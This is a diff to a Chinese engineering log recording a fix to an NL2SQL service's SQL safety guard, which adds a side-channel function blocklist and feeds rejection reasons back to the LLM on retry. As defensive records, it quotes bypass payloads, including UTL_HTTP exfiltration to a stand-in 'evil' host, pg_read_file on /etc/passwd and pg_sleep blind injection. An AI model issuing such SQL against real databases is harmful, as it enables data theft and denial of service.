@@ -24,8 +24,9 @@
 > §3 P1 第 5、6 项同时闭合；收口 code-reviewer 复审 **APPROVE-WITH-NITS**（0/0/0/2 LOW，
 > 两条带触发条件记录，见 §12 复审）。
 > **§2.1（CRITICAL）已全部清零；§3 的 P0 路线图亦已清空**。
-> **仍待处理**：§2.2 的 H4 / H6 / H7、§2.3 的 M1–M6、M8–M10、以及 §2.4 / §2.5 全部。
-> **进行中**：§2.3 的 **M1 / M2**（SQL Guard 侧信道黑名单 + 拒绝原因回注重试反馈，2026-09-26 起）。
+> §2.3 的 **M1 / M2**（SQL Guard 侧信道黑名单 + 拒绝原因回注重试反馈）已于 2026-09-26 修复（见 §13）。
+> **仍待处理**：§2.2 的 H4 / H6 / H7、§2.3 的 M3–M6、M8–M10、以及 §2.4 / §2.5 全部。
+> **已立项待排期**：§13「残差」第 1 条（库侧只读兜底）已转为提案文件。
 
 ---
 
@@ -154,8 +155,8 @@
 
 | # | 缺陷 | 证据 |
 |---|---|---|
-| M1 | **SQL Guard 侧信道函数未覆盖**：缺 `pg_sleep`/`pg_advisory_lock`/`dblink`/`SLEEP`/`BENCHMARK`/`LOAD_FILE`/`UTL_HTTP`；`INTO` 过度拦截（含良性 `SELECT…INTO`）；sqlparse 跳过 `Literal/Comment` 的隐患。 | `business_db_pool.py:60-72`、`148-161` |
-| M2 | **SQL Guard 拒绝反馈不具体**：LLM 只见「未通过安全校验」，无法自愈守卫违规。 | `nl2sql_service.py:2076-2082` |
+| M1 | ~~**SQL Guard 侧信道函数未覆盖**：缺 `pg_sleep`/`pg_advisory_lock`/`dblink`/`SLEEP`/`BENCHMARK`/`LOAD_FILE`/`UTL_HTTP`；sqlparse 跳过 `Literal/Comment` 的隐患。~~ ✅ **已修复（2026-09-26，见 §13）**。<br>⚠️ **同行的「`INTO` 过度拦截（含良性 `SELECT…INTO`）」经实测修正**：四种 `INTO` 子句形态（PG 建表 / MySQL `OUTFILE` / 变量赋值 / 尾随）全部**应当拒**；唯一被误拒的合法形态是「未加引号的 `AS into` 别名」（PG 实测接受），属安全闸门应有的过拦偏向，**不改**（见 §13 决策原则）。 | `business_db_pool.py` |
+| M2 | ~~**SQL Guard 拒绝反馈不具体**：LLM 只见「未通过安全校验」，无法自愈守卫违规。~~ ✅ **已修复（2026-09-26，见 §13）**。 | `nl2sql_service.py:2076-2082` |
 | M3 | **`QueryPlan.from_dict` 吞所有解析错误**：损坏输入静默变空 tuple，掩盖根因（文档明言「绝不抛错」）。 | `query_plan.py:203-206` |
 | M4 | **无同模型瞬态重试**：`generateQueryPlan`/`generateSql` 内部不捕获瞬态 LLM 异常，只靠模型 fallback（换模型≠同模型重试）。 | `nl2sql_service.py:1608`、`2039` |
 | M5 | **L3 CTE 引擎是死代码**：`_executeChainedSteps`/`_executeSingleChainedStep` 仅测试引用，无生产接线，且含未计量 LLM 调用。 | `chat_service.py:1935-2023` |
@@ -837,3 +838,94 @@ H3 端到端 3049 ≤ 4000 且「留最新/丢最旧/`[SQL:` 标记完整」；�
    行为等价性由容器内探针（真机代码跑真实过滤/排序/截断/预算逻辑）+ 15 个单元用例覆盖。
 5. **两条有待触发条件的 LOW**（收口复审，见上）：负预算的 `_clipText` 负索引切片、退化分支日志措辞
    —— 均带明确触发条件，触发时**必须**与代码改动同批处理（改代码即需重新部署并重录 md5 证据）。
+
+---
+
+## 13. 修复记录：SQL Guard 侧信道黑名单 + 拒绝原因回注（2026-09-26）
+
+SSOT：`Harness/changes/fix-sql-guard-side-channel-and-reject-feedback/`（含 9 段完整记录、两轮审查逐条处置、RED 证据）。
+
+### 问题（§2.3 M1 / M2 的完整形态）
+
+1. **M1 拦得不够**：`_FORBIDDEN_FUNCTIONS` 只覆盖写/文件类函数，**侧信道整类缺失** ——
+   `SELECT pg_sleep(5)`（拖住连接 = DoS + 时间盲注）、`UTL_HTTP.REQUEST('http://evil/?'||数据)`
+   （出网外泄）、`dblink(...)`（跨库）、`LOAD_FILE`/`UTL_FILE`（读服务器文件）、
+   `pg_terminate_backend`/`pg_advisory_lock`（进程与锁控制）全部以「首 token 合法」通过白名单。
+   这是「只读 SELECT」核心约束的**实质绕过**，不是理论问题。
+2. **M1 附带（评估文本需修正）**：原写的「`INTO` 过度拦截（含良性 `SELECT…INTO`）」经实测不成立，
+   见下表与 M1 行更正。
+3. **M2 拦了不说清**：重试循环只回注固定文案，**原因已在 `exc` 里、也进了日志，但没进 prompt**
+   ⇒ 模型看不到违规点，只能反复盲改，重试预算烧完整问失败。
+
+### 修复
+
+| 位置 | 改动 |
+|---|---|
+| `business_db_pool.py` | 三集合分口径：`_FORBIDDEN_FUNCTIONS`（裸名 + 引号归一 + 不看形态）、`_FORBIDDEN_CALLS`（须调用形态 `(`）、`_FORBIDDEN_PACKAGES`（须包名形态 `.`）；判定前 `_unquoteIdentifier` 剥 `"x"`/`` `x` ``/`[x]`、前瞻时跳过注释；把 `T.Literal.String.Symbol` 的判定**提前**到字面量跳过之前 |
+| `nl2sql_service.py` | `except SqlSafetyError` 分支把 `str(exc)`（**只含原因，`exc.sql` 不进消息体**）拼进 `errors`；`_buildUserPrompt` 的 errors 段补 `_sanitizeContext`（与 executionError 段同口径） |
+
+**关键设计判断**：「调用形态」与「包名形态」必须分开 —— 纯函数名只可能以 `(` 调用，
+若把 `.` 也当命中，`SELECT sleep.col FROM foo sleep`（黑名单词作表别名）会被误杀。
+**三集合不可合并**：`sleep`/`benchmark` 是普通词，裸名匹配会杀掉 `SELECT COUNT(*) AS sleep`。
+
+### 验证（TDD：先 RED 后 GREEN）
+
+- **RED-1**（实现前）：19 例「必须拒」全部 `DID NOT RAISE SqlSafetyError`，5 例「必须放行」全绿（防过拦对照）。
+- **RED-2**（反向探针）：把实现退回朴素版（不剥引号、前瞻不跳注释），恰好 `"pg_sleep"(5)` / `` `sleep`(10) `` / `pg_sleep /*c*/ (5)` 三例转红 ⇒ 证明新代码**承重**而非装饰。
+- **RED-4**（复审后二次循环）：13 例红（11 例漏拦 + 2 例误杀），逐条来自两位审查的实测清单。
+- GREEN：`test_datasource_pool.py` 104 passed、`test_nl2sql_service.py` 102 passed。
+- **零误杀面（探针）**：按黑名单全词表在 **prod `qa_metadata`** 的 `ontology_class`/`ontology_property`
+  名字上做去噪子串匹配 → **命中 0 行** ⇒ 现网不存在会因本批被误拒的类/属性。
+
+### `INTO` 实测（修正 M1 行描述）
+
+```
+REJECT  SELECT a FROM t INTO x / SELECT a INTO newtab FROM t     ← PG 建表（写）
+REJECT  SELECT a INTO OUTFILE '/tmp/x' FROM t                    ← MySQL 写文件
+REJECT  SELECT a INTO @v FROM t                                  ← MySQL 变量赋值
+ACCEPT  SELECT "into" FROM t / SELECT into_col FROM t            ← 引号标识符（唯一合法写法）
+```
+
+真实 PostgreSQL 实测 `SELECT 1 AS into` **合法**、`SELECT 1 AS "into"` 亦合法 ⇒ 唯一误拒是
+「未加引号的 `AS into` 别名」。**决策原则**：安全闸门的**误拒**可由 M2 的自愈反馈消解（模型看到
+「禁止的 SQL 操作: INTO」即改名），**漏拦不可自愈**（数据已出去）⇒ 闸门一律取过拦偏向，不为此引入 shape 判定。
+
+### 审查（两轮，均找出真缺陷 —— 本批经历「实现 → 审查 → 再 RED → 再 GREEN」）
+
+| 轮次 | 首轮结论 | 处置 |
+|---|---|---|
+| code-reviewer | **WARNING**（0/1/1/2） | HIGH（引号族绕过）+ MEDIUM（点号形态误杀）当场修 |
+| security-reviewer | **FAIL**（0/2/4/4） | 2 HIGH（`pg_sleep_for`/`pg_sleep_until`、引号族）+ 3 MEDIUM（`DBMS_LOB`/`MASTER_POS_WAIT`/`lo_put`）+ 1 LOW 当场修 |
+
+**两轮相互独立地命中同一个 HIGH**（引号包裹的 `_FORBIDDEN_FUNCTIONS` 族：`SELECT "nextval"('s')`
+可推进序列、`"pg_read_file"('/etc/passwd')` 可读文件）—— 该形态属**预存**绕过（`String.Symbol`
+被字面量分支跳过），但本批已引入归一化解药却只做了一半，故一并修掉，不留「同一手法一半能堵一半不能」的矛盾。
+**教训**：以「补黑名单」为目标的批次，审查必须要求**可执行的对照表**（逐形态实测 ALLOWED/REJECTED），
+否则读码审查会漏掉整个「枚举完整性」维度 —— 本次两轮审查给出的正是这种表，且都被转成了新用例。
+
+### 遗留（残差）
+
+1. **库侧无只读兜底（security MEDIUM，结构性）**：黑名单是**枚举式**防御（本批实测即抓到
+   `pg_sleep_for`、`DBMS_LOB.LOADFROMFILE`、`MASTER_POS_WAIT`、`lo_put` 等漏项），解析层永远追不上
+   方言/自定义/未来新增函数。真正的闸门应是**库侧只读角色 + 服务端 `statement_timeout`**
+   （实测 `grep statement_timeout|READ ONLY` 在 `business_db_pool.py`/`config.py` **零命中**）。
+   已转独立提案：`Harness/changes/2026-09-26-sql-guard-db-side-readonly-proposal.md`。
+   顺带纠正 `nl2sql-engine.md` 原写的「连接级 `statement_timeout`」（不存在）与 `sql_guard.py` 路径漂移。
+2. **`(pg_sleep)(5)` 放行**（security LOW）：三方言下 `(func)(args)` 均非合法调用语法（不会执行），`_callShape` 已注明。
+3. **安全校验失败日志不截断**（code LOW）：`logger.warning(…, exc)` 受 LLM `max_tokens` 上界约束，低危，记录待清理。
+4. **M3 仍未做**：`QueryPlan.from_dict` 吞解析错误（§3 P1 第 9 项本批只完成 M1/M2 两项）。
+
+### 部署验证（2026-09-26）
+
+- **镜像重建**（非 `docker cp`）：`docker compose build backend` → `up -d backend`，容器日志出现
+  `Application startup complete.`；
+- **容器代码 == 仓库代码**：两个改动文件 md5 逐一对照 **MATCH**
+  （`business_db_pool.py b0cc2f4b…`、`nl2sql_service.py 6a91c5c6…`）；
+- **容器内真机探针**（真实模块，非测试替身）：**14 例「必须拒」全拒 / 6 例「必须放行」全放行 /
+  M2 消息含原因且不含被拒 SQL** → `PROBE PASS`；
+- **网关**：重建容器后 `/api/v1/health` 直连 8000 与经 nginx 5173 **均 200**（上游解析持久化修复有效）；
+- **测试**：全量 unit `2 failed / 2324 passed`（两条失败均为预存，delta=0）；
+  `test_datasource_pool.py` + `test_nl2sql_service.py` 在**最终 hash** 上复跑 **206 passed**；
+  集成切片 6 文件 **45 passed**；`ruff` 与 HEAD 同集合（delta=0）。
+- ⚠️ 前置：全量 unit 跑完会把测试库 `ontology_class` 截空（既有 truncate 陷阱），
+  集成前需 `DROP SCHEMA public CASCADE` + `DATABASE_URL=<test> alembic upgrade head` 恢复。
